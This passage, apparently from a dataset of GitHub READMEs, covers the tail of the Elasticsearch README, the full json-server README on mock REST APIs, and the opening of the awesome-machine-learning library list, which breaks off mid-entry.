we would want to change from the default 5 shards with 1 replica per index, to only 1 shard with 1 replica per index (== per twitter user). Here is how this can be done (the configuration can be in yaml as well):\ncurl -XPUT http://localhost:9200/another_user?pretty -H 'Content-Type: application/json' -d '\n{\n    \"index\" : {\n        \"number_of_shards\" : 1,\n        \"number_of_replicas\" : 1\n    }\n}'\n\nSearch (and similar operations) are multi index aware. This means that we can easily search on more than one\nindex (twitter user), for example:\ncurl -XGET 'http://localhost:9200/kimchy,another_user/_search?pretty=true' -H 'Content-Type: application/json' -d '\n{\n    \"query\" : {\n        \"match_all\" : {}\n    }\n}'\n\nOr on all the indices:\ncurl -XGET 'http://localhost:9200/_search?pretty=true' -H 'Content-Type: application/json' -d '\n{\n    \"query\" : {\n        \"match_all\" : {}\n    }\n}'\n\n{One liner teaser}: And the cool part about that? You can easily search on multiple twitter users (indices), with different boost levels per user (index), making social search so much simpler (results from my friends rank higher than results from friends of my friends).\nDistributed, Highly Available\nLet\u2019s face it, things will fail\u2026.\nElasticsearch is a highly available and distributed search engine. Each index is broken down into shards, and each shard can have one or more replicas. By default, an index is created with 5 shards and 1 replica per shard (5/1). There are many topologies that can be used, including 1/10 (improve search performance), or 20/1 (improve indexing performance, with search executed in a map reduce fashion across shards).\nIn order to play with the distributed nature of Elasticsearch, simply bring more nodes up and shut down nodes. The system will continue to serve requests (make sure you use the correct http port) with the latest data indexed.\nWhere to go from here?\nWe have just covered a very small portion of what Elasticsearch is all about. For more information, please refer to the elastic.co website. General questions can be asked on the Elastic Discourse forum or on IRC on Freenode at #elasticsearch. The Elasticsearch GitHub repository is reserved for bug reports and feature requests only.\nBuilding from Source\nElasticsearch uses Gradle for its build system.\nIn order to create a distribution, simply run the ./gradlew assemble command in the cloned directory.\nThe distribution for each project will be created under the build/distributions directory in that project.\nSee the TESTING file for more information about running the Elasticsearch test suite.\nUpgrading from older Elasticsearch versions\nIn order to ensure a smooth upgrade process from earlier versions of Elasticsearch, please see our upgrade documentation for more details on the upgrade process."}, {"title": "typicode/json-server", "language": "JavaScript", "content": "JSON Server  \nGet a full fake REST API with zero coding in less than 30 seconds (seriously)\nCreated with <3 for front-end developers who need a quick back-end for prototyping and mocking.\n\nEgghead.io free video tutorial - Creating demo APIs with json-server\nJSONPlaceholder - Live running version\nMy JSON Server - no installation required, use your own data\n\nSee also:\n\n\ud83d\udc36 husky - Git hooks made easy\n\ud83c\udfe8 hotel - developer tool with local .localhost domain and https out of the box\n\n\n\n\nSponsors\nGold\n\n\n\n\n\nBronze\n\n\n\n\n\n\u00a0\n\nBecome a sponsor and have your company logo here\n\nTable of contents\n\nGetting started\nRoutes\n\nPlural routes\nSingular routes\nFilter\nPaginate\nSort\nSlice\nOperators\nFull-text search\nRelationships\nDatabase\nHomepage\n\n\nExtras\n\nStatic file server\nAlternative port\nAccess from anywhere\nRemote schema\nGenerate random data\nHTTPS\nAdd custom routes\nAdd middlewares\nCLI usage\nModule\n\nSimple example\nCustom routes example\nAccess control example\nCustom output example\nRewriter example\nMounting JSON Server on another endpoint example\nAPI\n\n\nDeployment\n\n\nLinks\n\nVideo\nArticles\nThird-party tools\n\n\nLicense\n\nGetting started\nInstall JSON Server\nnpm install -g json-server\n\nCreate a db.json file with some data\n{\n  \"posts\": [\n    { \"id\": 1, \"title\": \"json-server\", \"author\": \"typicode\" }\n  ],\n  \"comments\": [\n    { \"id\": 1, \"body\": \"some comment\", \"postId\": 1 }\n  ],\n  \"profile\": { \"name\": \"typicode\" }\n}\nStart JSON Server\njson-server --watch db.json\nNow if you go to http://localhost:3000/posts/1, you'll get\n{ \"id\": 1, \"title\": \"json-server\", \"author\": \"typicode\" }\nAlso when doing requests, it's good to know that:\n\nIf you make POST, PUT, PATCH or DELETE requests, changes will be automatically and safely saved to db.json using lowdb.\nYour request body JSON should be object enclosed, just like the GET output. (for example {\"name\": \"Foobar\"})\nId values are not mutable. Any id value in the body of your PUT or PATCH request will be ignored. Only a value set in a POST request will be respected, but only if not already taken.\nA POST, PUT or PATCH request should include a Content-Type: application/json header to use the JSON in the request body. Otherwise it will result in a 200 OK but without changes being made to the data.\n\nRoutes\nBased on the previous db.json file, here are all the default routes. You can also add other routes using --routes.\nPlural routes\nGET    /posts\nGET    /posts/1\nPOST   /posts\nPUT    /posts/1\nPATCH  /posts/1\nDELETE /posts/1\n\nSingular routes\nGET    /profile\nPOST   /profile\nPUT    /profile\nPATCH  /profile\n\nFilter\nUse . to access deep properties\nGET /posts?title=json-server&author=typicode\nGET /posts?id=1&id=2\nGET /comments?author.name=typicode\n\nPaginate\nUse _page and optionally _limit to paginate returned data.\nIn the Link header you'll get first, prev, next and last links.\nGET /posts?_page=7\nGET /posts?_page=7&_limit=20\n\n10 items are returned by default\nSort\nAdd _sort and _order (ascending order by default)\nGET /posts?_sort=views&_order=asc\nGET /posts/1/comments?_sort=votes&_order=asc\n\nFor multiple fields, use the following format:\nGET /posts?_sort=user,views&_order=desc,asc\n\nSlice\nAdd _start and _end or _limit (an X-Total-Count header is included in the response)\nGET /posts?_start=20&_end=30\nGET /posts/1/comments?_start=20&_end=30\nGET /posts/1/comments?_start=20&_limit=10\n\nWorks exactly as Array.slice (i.e. _start is inclusive and _end exclusive)\nOperators\nAdd _gte or _lte for getting a range\nGET /posts?views_gte=10&views_lte=20\n\nAdd _ne to exclude a value\nGET /posts?id_ne=1\n\nAdd _like to filter (RegExp supported)\nGET /posts?title_like=server\n\nFull-text search\nAdd q\nGET /posts?q=internet\n\nRelationships\nTo include children resources, add _embed\nGET /posts?_embed=comments\nGET /posts/1?_embed=comments\n\nTo include parent resource, add _expand\nGET /comments?_expand=post\nGET /comments/1?_expand=post\n\nTo get or create nested resources (by default one level, add custom routes for more)\nGET  /posts/1/comments\nPOST /posts/1/comments\n\nDatabase\nGET /db\n\nHomepage\nReturns default index file or serves ./public directory\nGET /\n\nExtras\nStatic file server\nYou can use JSON Server to serve your HTML, JS and CSS, simply create a ./public directory\nor use --static to set a different static files directory.\nmkdir public\necho 'hello world' > public/index.html\njson-server db.json\njson-server db.json --static ./some-other-dir\nAlternative port\nYou can start JSON Server on other ports with the --port flag:\n$ json-server --watch db.json --port 3004\nAccess from anywhere\nYou can access your fake API from anywhere using CORS and JSONP.\nRemote schema\nYou can load remote schemas.\n$ json-server http://example.com/file.json\n$ json-server http://jsonplaceholder.typicode.com/db\nGenerate random data\nUsing JS instead of a JSON file, you can create data programmatically.\n// index.js\nmodule.exports = () => {\n  const data = { users: [] }\n  // Create 1000 users\n  for (let i = 0; i < 1000; i++) {\n    data.users.push({ id: i, name: `user${i}` })\n  }\n  return data\n}\n$ json-server index.js\nTip use modules like Faker, Casual, Chance or JSON Schema Faker.\nHTTPS\nThere are many ways to set up SSL in development. One simple way is to use hotel.\nAdd custom routes\nCreate a routes.json file. Pay attention to start every route with /.\n{\n  \"/api/*\": \"/$1\",\n  \"/:resource/:id/show\": \"/:resource/:id\",\n  \"/posts/:category\": \"/posts?category=:category\",\n  \"/articles\\\\?id=:id\": \"/posts/:id\"\n}\nStart JSON Server with --routes option.\njson-server db.json --routes routes.json\nNow you can access resources using additional routes.\n/api/posts # \u2192 /posts\n/api/posts/1  # \u2192 /posts/1\n/posts/1/show # \u2192 /posts/1\n/posts/javascript # \u2192 /posts?category=javascript\n/articles?id=1 # \u2192 /posts/1\nAdd middlewares\nYou can add your middlewares from the CLI using --middlewares option:\n// hello.js\nmodule.exports = (req, res, next) => {\n  res.header('X-Hello', 'World')\n  next()\n}\njson-server db.json --middlewares ./hello.js\njson-server db.json --middlewares ./first.js ./second.js\nCLI usage\njson-server [options] <source>\n\nOptions:\n  --config, -c       Path to config file           [default: \"json-server.json\"]\n  --port, -p         Set port                                    [default: 3000]\n  --host, -H         Set host                             [default: \"localhost\"]\n  --watch, -w        Watch file(s)                                     [boolean]\n  --routes, -r       Path to routes file\n  --middlewares, -m  Paths to middleware files                           [array]\n  --static, -s       Set static files directory\n  --read-only, --ro  Allow only GET requests                           [boolean]\n  --no-cors, --nc    Disable Cross-Origin Resource Sharing             [boolean]\n  --no-gzip, --ng    Disable GZIP Content-Encoding                     [boolean]\n  --snapshots, -S    Set snapshots directory                      [default: \".\"]\n  --delay, -d        Add delay to responses (ms)\n  --id, -i           Set database id property (e.g. _id)         [default: \"id\"]\n  --foreignKeySuffix, --fks  Set foreign key suffix, (e.g. _id as in post_id)\n                                                                 [default: \"Id\"]\n  --quiet, -q        Suppress log messages from output                 [boolean]\n  --help, -h         Show help                                         [boolean]\n  --version, -v      Show version number                               [boolean]\n\nExamples:\n  json-server db.json\n  json-server file.js\n  json-server http://example.com/db.json\n\nhttps://github.com/typicode/json-server\n\nYou can also set options in a json-server.json configuration file.\n{\n  \"port\": 3000\n}\nModule\nIf you need to add authentication, validation, or any behavior, you can use the project as a module in combination with other Express middlewares.\nSimple example\n$ npm install json-server --save-dev\n// server.js\nconst jsonServer = require('json-server')\nconst server = jsonServer.create()\nconst router = jsonServer.router('db.json')\nconst middlewares = jsonServer.defaults()\n\nserver.use(middlewares)\nserver.use(router)\nserver.listen(3000, () => {\n  console.log('JSON Server is running')\n})\n$ node server.js\nThe path you provide to the jsonServer.router function  is relative to the directory from where you launch your node process. If you run the above code from another directory, it\u2019s better to use an absolute path:\nconst path = require('path')\nconst router = jsonServer.router(path.join(__dirname, 'db.json'))\nFor an in-memory database, simply pass an object to jsonServer.router().\nPlease note also that jsonServer.router() can be used in existing Express projects.\nCustom routes example\nLet's say you want a route that echoes query parameters and another one that set a timestamp on every resource created.\nconst jsonServer = require('json-server')\nconst server = jsonServer.create()\nconst router = jsonServer.router('db.json')\nconst middlewares = jsonServer.defaults()\n\n// Set default middlewares (logger, static, cors and no-cache)\nserver.use(middlewares)\n\n// Add custom routes before JSON Server router\nserver.get('/echo', (req, res) => {\n  res.jsonp(req.query)\n})\n\n// To handle POST, PUT and PATCH you need to use a body-parser\n// You can use the one used by JSON Server\nserver.use(jsonServer.bodyParser)\nserver.use((req, res, next) => {\n  if (req.method === 'POST') {\n    req.body.createdAt = Date.now()\n  }\n  // Continue to JSON Server router\n  next()\n})\n\n// Use default router\nserver.use(router)\nserver.listen(3000, () => {\n  console.log('JSON Server is running')\n})\nAccess control example\nconst jsonServer = require('json-server')\nconst server = jsonServer.create()\nconst router = jsonServer.router('db.json')\nconst middlewares = jsonServer.defaults()\n\nserver.use(middlewares)\nserver.use((req, res, next) => {\n if (isAuthorized(req)) { // add your authorization logic here\n   next() // continue to JSON Server router\n } else {\n   res.sendStatus(401)\n }\n})\nserver.use(router)\nserver.listen(3000, () => {\n  console.log('JSON Server is running')\n})\nCustom output example\nTo modify responses, overwrite router.render method:\n// In this example, returned resources will be wrapped in a body property\nrouter.render = (req, res) => {\n  res.jsonp({\n    body: res.locals.data\n  })\n}\nYou can set your own status code for the response:\n// In this example we simulate a server side error response\nrouter.render = (req, res) => {\n  res.status(500).jsonp({\n    error: \"error message here\"\n  })\n}\nRewriter example\nTo add rewrite rules, use jsonServer.rewriter():\n// Add this before server.use(router)\nserver.use(jsonServer.rewriter({\n  '/api/*': '/$1',\n  '/blog/:resource/:id/show': '/:resource/:id'\n}))\nMounting JSON Server on another endpoint example\nAlternatively, you can also mount the router on /api.\nserver.use('/api', router)\nAPI\njsonServer.create()\nReturns an Express server.\njsonServer.defaults([options])\nReturns middlewares used by JSON Server.\n\noptions\n\nstatic path to static files\nlogger enable logger middleware (default: true)\nbodyParser enable body-parser middleware (default: true)\nnoCors disable CORS (default: false)\nreadOnly accept only GET requests (default: false)\n\n\n\njsonServer.router([path|object])\nReturns JSON Server router.\nDeployment\nYou can deploy JSON Server. For example, JSONPlaceholder is an online fake API powered by JSON Server and running on Heroku.\nLinks\nVideo\n\nCreating Demo APIs with json-server on egghead.io\n\nArticles\n\nNode Module Of The Week - json-server\nMock up your REST API with JSON Server\nng-admin: Add an AngularJS admin GUI to any RESTful API\nFast prototyping using Restangular and Json-server\nCreate a Mock REST API in Seconds for Prototyping your Frontend\nNo API? No Problem! Rapid Development via Mock APIs\nZero Code REST With json-server\n\nThird-party tools\n\nGrunt JSON Server\nDocker JSON Server\nJSON Server GUI\nJSON file generator\nJSON Server extension\n\nLicense\nMIT\nPatreon - Supporters \u2728"}, {"title": "josephmisiti/awesome-machine-learning", "language": "Python", "content": "Awesome Machine Learning \nA curated list of awesome machine learning frameworks, libraries and software (by language). Inspired by awesome-php.\nIf you want to contribute to this list (please do), send me a pull request or contact me @josephmisiti.\nAlso, a listed repository should be deprecated if:\n\nRepository's owner explicitly say that \"this library is not maintained\".\nNot committed for long time (2~3 years).\n\nFurther resources:\n\n\nFor a list of free machine learning books available for download, go here.\n\n\nFor a list of (mostly) free machine learning courses available online, go here.\n\n\nFor a list of blogs and newsletters on data science and machine learning, go here.\n\n\nFor a list of free-to-attend meetups and local events, go here.\n\n\nTable of Contents\nFrameworks and Libraries\n\nAPL\n\nGeneral-Purpose Machine Learning\n\n\nC\n\nGeneral-Purpose Machine Learning\nComputer Vision\n\n\nC++\n\nComputer Vision\nGeneral-Purpose Machine Learning\nNatural Language Processing\nSpeech Recognition\nSequence Analysis\nGesture Recognition\n\n\nCommon Lisp\n\nGeneral-Purpose Machine Learning\n\n\nClojure\n\nNatural Language Processing\nGeneral-Purpose Machine Learning\nData Analysis / Data Visualization\n\n\nCrystal\n\nGeneral-Purpose Machine Learning\n\n\nElixir\n\nGeneral-Purpose Machine Learning\nNatural Language Processing\n\n\nErlang\n\nGeneral-Purpose Machine Learning\n\n\nGo\n\nNatural Language Processing\nGeneral-Purpose Machine Learning\nData Analysis / Data Visualization\nFacial Detection and Recognition\nImage Classification\n\n\nHaskell\n\nGeneral-Purpose Machine Learning\n\n\nJava\n\nNatural Language Processing\nGeneral-Purpose Machine Learning\nSpeech Recognition\nData Analysis / Data Visualization\nDeep Learning\n\n\nJavascript\n\nNatural Language Processing\nData Analysis / Data Visualization\nGeneral-Purpose Machine Learning\nMisc\nDemos and Scripts\n\n\nJulia\n\nGeneral-Purpose Machine Learning\nNatural Language Processing\nData Analysis / Data Visualization\nMisc Stuff / Presentations\n\n\nLua\n\nGeneral-Purpose Machine Learning\nDemos and Scripts\n\n\nMatlab\n\nComputer Vision\nNatural Language Processing\nGeneral-Purpose Machine Learning\nData Analysis / Data Visualization\n\n\n.NET\n\nComputer Vision\nNatural Language Processing\nGeneral-Purpose Machine Learning\nData Analysis / Data Visualization\n\n\nObjective C\n\nGeneral-Purpose Machine Learning\n\n\nOCaml\n\nGeneral-Purpose Machine Learning\n\n\nPerl\n\nData Analysis / Data Visualization\nGeneral-Purpose Machine Learning\n\n\nPerl 6\nPHP\n\nNatural Language Processing\nGeneral-Purpose Machine Learning\n\n\nPython\n\nComputer Vision\nNatural Language Processing\nGeneral-Purpose Machine Learning\nData Analysis / Data Visualization\nMisc Scripts / iPython Notebooks / Codebases\nKaggle Competition Source Code\nNeural Networks\nReinforcement Learning\n\n\nRuby\n\nNatural Language Processing\nGeneral-Purpose Machine Learning\nData Analysis / Data Visualization\nMisc\n\n\nRust\n\nGeneral-Purpose Machine Learning\n\n\nR\n\nGeneral-Purpose Machine Learning\nData Analysis / Data Visualization\n\n\nSAS\n\nGeneral-Purpose Machine Learning\nData Analysis / Data Visualization\nNatural Language Processing\n\u5199\u4e2a\u811a\u672c\u628a\u5b83\u4eec\u722c\u4e0b\u6765 - Demos and Scripts\n\n\nScala\n\nNatural Language Processing\nData Analysis / Data Visualization\nGeneral-Purpose Machine Learning\n\n\nScheme\n\nNeural Networks\n\n\nSwift\n\nGeneral-Purpose Machine Learning\n\n\nTensorFlow\n\nGeneral-Purpose Machine Learning\n\n\n\nTools\n\nNeural Networks\nMisc\n\nCredits\n\nAPL\n\nGeneral-Purpose Machine Learning\n\nnaive-apl - Naive Bayesian Classifier implementation in APL. [Deprecated]\n\n\nC\n\nGeneral-Purpose Machine Learning\n\nDarknet - Darknet is an open source neural network framework written in C and CUDA. It is fast, easy to install, and supports CPU and GPU computation.\nRecommender - A C library for product recommendations/suggestions using collaborative filtering (CF).\nHybrid Recommender System - A hybrid recommender system based upon scikit-learn algorithms. [Deprecated]\nneonrvm - neonrvm is an open source machine learning library based on RVM technique. It's written in C programming language and comes with Python programming language bindings.\n\n\nComputer Vision\n\nCCV - C-based/Cached/Core Computer Vision Library, A Modern Computer Vision Library.\nVLFeat - VLFeat is an open and portable library of computer vision algorithms, which has Matlab toolbox.\n\n\nC++\n\nComputer Vision\n\nDLib - DLib has C++ and Python interfaces for face detection and training general object detectors.\nEBLearn - Eblearn is an object-oriented C++ library that implements various machine learning models [Deprecated]\nOpenCV - OpenCV has C++, C, Python, Java and MATLAB interfaces and supports Windows, Linux, Android and Mac OS.\nVIGRA - VIGRA is a generic cross-platform C++ computer vision and machine learning library for volumes of arbitrary dimensionality with Python bindings.\n\n\nGeneral-Purpose Machine Learning\n\nBanditLib - A simple Multi-armed Bandit library. [Deprecated]\nCaffe - A deep learning framework developed with cleanliness, readability, and speed in mind. [DEEP LEARNING]\nCatBoost - General purpose gradient boosting on decision trees library with categorical features support out of the box. It is easy to install, contains fast inference implementation and supports CPU and GPU (even multi-GPU) computation.\nCNTK - The Computational Network Toolkit (CNTK) by Microsoft Research, is a unified deep-learning toolkit that describes neural networks as a series of computational steps via a directed graph.\nCUDA - This is a fast C++/CUDA implementation of convolutional [DEEP LEARNING]\nDeepDetect - A machine learning API and server written in C++11. It makes state of the art machine learning easy to work with and integrate into existing applications.\nDistributed Machine learning Tool Kit (DMTK) - A distributed machine learning (parameter server) framework by Microsoft. Enables training models on large data sets across multiple machines. Current tools bundled with it include: LightLDA and Distributed (Multisense) Word Embedding.\nDLib - A suite of ML tools designed to be easy to imbed in other applications.\nDSSTNE - A software library created by Amazon for training and deploying deep neural networks using GPUs which emphasizes speed and scale over experimental flexibility.\nDyNet - A dynamic neural network library working well with networks that have dynamic structures that change for every training instance. Written in C++ with bindings in Python.\nFido - A highly-modular C++ machine learning library for embedded electronics and robotics.\nigraph - General purpose graph library.\nIntel(R) DAAL - A high performance software library developed by Intel and optimized for Intel's architectures. Library provides algorithmic building blocks for all stages of data analytics and allows to process data in batch, online and distributed modes.\nLightGBM - Microsoft's fast, distributed, high performance gradient boosting (GBDT, GBRT, GBM or MART) framework based on decision tree algorithms, used for ranking, classification and many other machine learning tasks.\nlibfm - A generic approach that allows to mimic most factorization models by feature engineering.\nMLDB - The Machine Learning Database is a database designed for machine learning. Send it commands over a RESTful API to store data, explore it using SQL, then train machine learning models and expose them as APIs.\nmlpack - A scalable C++ machine learning library.\nMXNet - Lightweight, Portable, Flexible Distributed/Mobile Deep Learning with Dynamic, Mutation-aware Dataflow Dep Scheduler; for Python, R, Julia, Go, Javascript and more.\nproNet-core - A general-purpose network embedding framework: pair-wise representations optimization Network Edit.\nPyCUDA - Python interface to CUDA\nROOT - A modular scientific software framework. It provides all the functionalities needed to deal with big data processing, statistical analysis, visualization and storage.\nshark - A fast, modular, feature-rich open-source C++ machine learning library.\nShogun - The Shogun Machine Learning Toolbox.\nsofia-ml - Suite of fast incremental algorithms.\nStan - A probabilistic programming language implementing full Bayesian statistical inference with Hamiltonian Monte Carlo sampling.\nTimbl - A software package/C++ library implementing several memory-based learning algorithms, among which IB1-IG, an implementation of k-nearest neighbor classification, and IGTree, a decision-tree approximation of IB1-IG. Commonly used for NLP.\nVowpal Wabbit (VW) - A fast out-of-core learning system.\nWarp-CTC - A fast parallel implementation of Connectionist Temporal Classification (CTC), on both CPU and GPU.\nXGBoost - A parallelized optimized general purpose gradient boosting library.\nThunderGBM - A fast library for GBDTs and Random Forests on GPUs.\nThunderSVM - A fast SVM library on GPUs and CPUs.\nLKYDeepNN - A header-only C++11 Neural Network library. Low dependency, native traditional chinese document.\nxLearn - A high performance, easy-to-use, and scalable machine learning package, which can be used to solve large-scale machine learning problems. xLearn is especially useful for solving machine learning problems on large-scale sparse data, which is very common in Internet services such as online advertisement and recommender systems.\nFeaturetools - A library for automated feature engineering. It excels at transforming transactional and relational datasets into feature matrices for machine learning using reusable feature engineering \"primitives\".\nskynet - A library for learning neural network, has C-interface, net set in JSON. Written in C++ with bindings in Python, C++ and C#.\nFeast - A feature store for the management, discovery, and access of machine learning features. Feast provides a consistent view of feature data for both model training and model serving.\nPolyaxon - A platform for reproducible and scalable machine learning and deep learning.\n\n\nNatural Language Processing\n\nBLLIP Parser - BLLIP Natural Language Parser (also known as the Charniak-Johnson parser).\ncolibri-core - C++ library, command line tools, and Python binding for extracting and working with basic linguistic constructions such as n-grams and skipgrams in a quick and memory-efficient way.\nCRF++ - Open source implementation of Conditional Random Fields (CRFs) for segmenting/labeling sequential data & other Natural Language Processing tasks. [Deprecated]\nCRFsuite - CRFsuite is an implementation of Conditional Random Fields (CRFs) for labeling sequential data. [Deprecated]\nfrog - Memory-based NLP suite developed for Dutch: PoS tagger, lemmatiser, dependency parser, NER, shallow parser, morphological analyzer.\nlibfolia - C++ library for the FoLiA format\nMeTA - MeTA : ModErn Text Analysis is a C++ Data Sciences Toolkit that facilitates mining big text data.\nMIT Information Extraction Toolkit - C, C++, and Python tools for named entity recognition and relation extraction\nucto - Unicode-aware regular-expression based tokenizer for various languages. Tool and C++ library. Supports FoLiA format.\n\n\nSpeech Recognition\n\nKaldi - Kaldi is a toolkit for speech recognition written in C++ and licensed under the Apache License v2.0. Kaldi is intended for use by speech recognition researchers.\n\n\nSequence Analysis\n\nToPS - This is an objected-oriented framework that facilitates the integration of probabilistic models for sequences over a user defined alphabet. [Deprecated]\n\n\nGesture Detection\n\ngrt - The Gesture Recognition Toolkit (GRT) is a cross-platform, open-source, C++ machine learning library designed for real-time gesture recognition.\n\n\nCommon Lisp\n\nGeneral-Purpose Machine Learning\n\nmgl - Neural networks (boltzmann machines, feed-forward and recurrent nets), Gaussian Processes.\nmgl-gpr - Evolutionary algorithms. [Deprecated]\ncl-libsvm - Wrapper for the libsvm support vector machine library. [Deprecated]\ncl-online-learning - Online learning algorithms (Perceptron, AROW, SCW, Logistic Regression).\ncl-random-forest - Implementation of Random Forest in Common Lisp.\n\n\nClojure\n\nNatural Language Processing\n\nClojure-openNLP - Natural Language Processing in Clojure (opennlp).\nInfections-clj - Rails-like inflection library for Clojure and ClojureScript.\n\n\nGeneral-Purpose Machine Learning\n\nTouchstone - Clojure A/B testing library. [Deprecated]\nClojush - The Push programming language and the PushGP genetic programming system implemented in Clojure.\nInfer - Inference and machine learning in Clojure. [Deprecated]\nClj-ML - A machine learning library for Clojure built on top of Weka and friends. [Deprecated]\nDL4CLJ - Clojure wrapper for Deeplearning4j.\nEncog - Clojure wrapper for Encog (v3) (Machine-Learning framework that specializes in neural-nets). [Deprecated]\nFungp - A genetic programming library for Clojure. [Deprecated]\nStatistiker - Basic Machine Learning algorithms in Clojure. [Deprecated]\nclortex - General Machine Learning library using Numenta\u2019s Cortical Learning Algorithm. [Deprecated]\ncomportex - Functionally composable Machine Learning library using Numenta\u2019s Cortical Learning Algorithm. [Deprecated]\ncortex - Neural networks, regression and feature learning in Clojure.\nlambda-ml - Simple, concise implementations of machine learning techniques and utilities in Clojure.\n\n\nData Analysis / Data Visualization\n\nIncanter - Incanter is a Clojure-based, R-like platform for statistical computing and graphics.\nPigPen - Map-Reduce for Clojure.\nEnvision - Clojure Data Visualisation library, based on Statistiker and D3.\n\n\nCrystal\n\nGeneral-Purpose Machine Learning\n\nmachine - Simple machine learning algorithm.\ncrystal-fann - FANN (Fast Artificial Neural Network) binding.\n\n\nElixir\n\nGeneral-Purpose Machine Learning\n\nSimple Bayes - A Simple Bayes / Naive Bayes implementation in Elixir.\nemel - A simple and functional machine learning library written in Elixir.\n\n\nNatural Language Processing\n\nStemmer - An English (Porter2) stemming implementation in Elixir.\n\n\nErlang\n\nGeneral-Purpose Machine Learning\n\nDisco - Map Reduce in Erlang. [Deprecated]\nYanni - ANN neural networks using Erlangs leightweight processes.\n\n\nGo\n\nNatural Language Processing\n\ngo-porterstemmer - A native Go clean room implementation of the Porter Stemming algorithm. [Deprecated]\npaicehusk - Golang implementation of the Paice/Husk Stemming Algorithm.\nsnowball - Snowball Stemmer for Go.\nTextbox - Natural language processing SDK from Machine Box\ngo-ngram - In-memory n-gram index with compression.\nword-embedding - Word Embeddings: the full implementation of word2vec, GloVe in Go.\nsentences - Golang implementation of Punkt sentence tokenizer.\n\n\nGeneral-Purpose Machine Learning\n\neaopt - An evolutionary optimization library.\nGo Learn - Machine Learning for Go. [Deprecated]\ngo-pr - Pattern recognition package in Go lang. [Deprecated]\ngo-ml - Linear / Logistic regression, Neural Networks, Collaborative Filtering and Gaussian Multivariate Distribution. [Deprecated]\nbayesian - Naive Bayesian Classification for Golang. [Deprecated]\ngo-galib - Genetic Algorithms library written in Go / Golang. [Deprecated]\nCloudforest - Ensembles of decision trees in Go/Golang. [Deprecated]\ngobrain - Neural Networks written in Go.\nGoNN - GoNN is an implementation of Neural Network in Go Language, which includes BPNN, RBF, PCN. [Deprecated]\ngo-mxnet-predictor - Go binding for MXNet c_predict_api to do inference with pre-trained model.\nneat - Plug-and-play, parallel Go framework for NeuroEvolution of Augmenting Topologies (NEAT). [Deprecated]\ngo-ml-transpiler - An open source Go transpiler for machine learning models.\ntherfoo - An embedded deep learning library for Go.\n\n\nData Analysis / Data Visualization\n\ngo-graph - Graph library for Go/Golang language. [Deprecated]\nSVGo - The Go Language library for SVG generation.\nRF - Random forests implementation in Go. [Deprecated]\nGlot - Glot is a plotting library for Golang built on top of gnuplot.\n\n\nFacial Detection and Recognition\n\nFacebox - Facial detection and recognition SDK with one-shot teaching from Machine Box\n\n\nImage Classification\n\nTagbox - Image classification SDK with one-shot teaching from Machine Box\nNudebox - Nudity detection from Machine Box\n\n\nHaskell\n\nGeneral-Purpose Machine Learning\n\nhaskell-ml - Haskell implementations of various ML algorithms. [Deprecated]\nHLearn - a suite of libraries for interpreting machine learning models according to their algebraic structure. [Deprecated]\nhnn - Haskell Neural Network library.\nhopfield-networks - Hopfield Networks for unsupervised learning in Haskell. [Deprecated]\nDNNGraph - A DSL for deep neural networks. [Deprecated]\nLambdaNet - Configurable Neural Networks in Haskell. [Deprecated]\n\n\nJava\n\nNatural Language Processing\n\nCortical.io - Retina: an API performing complex NLP operations (disambiguation, classification, streaming text filtering, etc...) as quickly and intuitively as the brain.\nIRIS - Cortical.io's FREE NLP, Retina API Analysis Tool (written in JavaFX!) - See the Tutorial Video.\nCoreNLP - Stanford CoreNLP provides a set of natural language analysis tools which can take raw English language text input and give the base forms of words.\nStanford Parser - A natural language parser is a program that works out the grammatical structure of sentences.\nStanford POS Tagger - A Part-Of-Speech Tagger (POS Tagger).\nStanford Name Entity Recognizer - Stanford NER is a Java implementation of a Named Entity Recognizer.\nStanford Word Segmenter - Tokenization of raw text is a standard pre-processing step for many NLP tasks.\nTregex, Tsurgeon and Semgrex - Tregex is a utility for matching patterns in trees, based on tree relationships and regular expression matches on nodes (the name is short for \"tree regular expressions\").\nStanford Phrasal: A Phrase-Based Translation System\nStanford English Tokenizer - Stanford Phrasal is a state-of-the-art statistical phrase-based machine translation system, written in Java.\nStanford Tokens Regex - A tokenizer divides text into a sequence of tokens, which roughly correspond to \"words\".\nStanford Temporal Tagger - SUTime is a library for recognizing and normalizing time expressions.\nStanford SPIED - Learning entities from unlabeled text starting with seed sets using patterns in an iterative fashion.\nStanford Topic Modeling Toolbox - Topic modeling tools to social scientists and others who wish to perform analysis on datasets.\nTwitter Text Java - A Java implementation of Twitter's text processing library.\nMALLET - A Java-based package for statistical natural language processing, document classification, clustering, topic modeling, information extraction, and other machine learning applications to text.\nOpenNLP - a machine learning based toolkit for the processing of natural language text.\nLingPipe - A tool kit for processing text using computational linguistics.\nClearTK - ClearTK provides a framework for developing statistical natural language processing (NLP) components in Java and is built on top of Apache UIMA. [Deprecated]\nApache cTAKES - Apache clinical Text Analysis and Knowledge Extraction System (cTAKES) is an open-source natural language processing system for information extraction from electronic medical record clinical free-text.\nNLP4J - The NLP4J project provides software and resources for natural language processing. The project started at the Center for Computational Language and EducAtion Research, and is currently developed by the Center for Language and Information Research at Emory University. [Deprecated]\nCogcompNLP - This project collects a number of core libraries for Natural Language Processing (NLP) developed in the University of Illinois' Cognitive Computation Group, for example illinois-core-utilities which provides a set of NLP-friendly data structures and a number of NLP-related utilities that support writing NLP applications, running experiments, etc, illinois-edison a library for feature extraction from illinois-core-utilities data structures and many other packages.\n\n\nGeneral-Purpose Machine Learning\n\naerosolve - A machine learning library by Airbnb designed from the ground up to be human friendly.\nAMIDST Toolbox - A Java Toolbox for Scalable Probabilistic Machine Learning.\nDatumbox - Machine Learning framework for rapid development of Machine Learning and Statistical applications.\nELKI - Java toolkit for data mining. (unsupervised: clustering, outlier detection etc.)\nEncog - An advanced neural network and machine learning framework. Encog contains classes to create a wide variety of networks, as well as support classes to normalize and process data for these neural networks. Encog trains using multithreaded resilient propagation. Encog can also make use of a GPU to further speed processing time. A GUI based workbench is also provided to help model and train neural networks.\nFlinkML in Apache Flink - Distributed machine learning library in Flink.\nH2O - ML engine that supports distributed learning on Hadoop, Spark or your laptop via APIs in R, Python, Scala, REST/JSON.\nhtm.java - General Machine Learning library using Numenta\u2019s Cortical Learning Algorithm.\nliblinear-java - Java version of liblinear.\nMahout - Distributed machine learning.\nMeka - An open source implementation of methods for multi-label classification and evaluation (extension to Weka).\nMLlib in Apache Spark - Distributed machine learning library in Spark\nHydrosphere Mist - a service for deployment Apache Spark MLLib machine learning models as realtime, batch or reactive web services.\nNeuroph - Neuroph is lightweight Java neural network framework\nORYX - Lambda Architecture Framework using Apache Spark and Apache Kafka with a specialization for real-time large-scale machine learning.\nSamoa SAMOA is a framework that includes distributed machine 